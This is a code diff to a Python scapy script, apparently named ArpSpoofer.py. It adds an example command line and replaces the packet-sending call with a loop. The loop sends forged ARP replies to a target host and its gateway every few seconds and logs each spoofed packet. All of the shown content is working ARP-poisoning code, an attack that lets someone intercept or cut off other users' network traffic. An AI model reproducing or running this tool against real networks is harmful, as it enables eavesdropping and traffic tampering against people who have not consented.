@@ -2,6 +2,9 @@ from scapy.all import *
 import argparse
 import time
 
+#example usage:
+# sudo python3 ArpSpoofer.py -i eth0 -t 10.0.0.1 -d 5 -gw
+
 ARP_ISAT_CODE = 2
 IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"   
 
@@ -10,6 +13,9 @@ def get_mac_by_ip(ip):
     """
     get MAC address of a specified IP.
     """
+    if ip == "255.255.255.255":
+        return "ff:ff:ff:ff:ff:ff"
+
     arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
     response = srp1(arp_request, timeout=1, verbose=False)
     if response:
@@ -55,7 +61,13 @@ def spoof(args : dict):
         arp_packets.append(Ether(dst=gw_mac)/ARP(op=ARP_ISAT_CODE,pdst=gw_ip,hwdst=gw_mac,psrc=args['target']))
     
     # send the arp packets to the target every DELAY_TIME sec
-    sendp(arp_packets, inter=args['delay'], loop=1, iface=args['iface'], verbose=0)
+    while True:
+        sendp(arp_packets, iface=args['iface'], verbose=0)
+        for packet in arp_packets:
+            print(f"sent arp packet: {packet[ARP].psrc} is at {packet[ARP].hwsrc} to {packet[ARP].pdst}")
+        print('\n')
+        time.sleep(args["delay"])
+        
 
 
 def main():
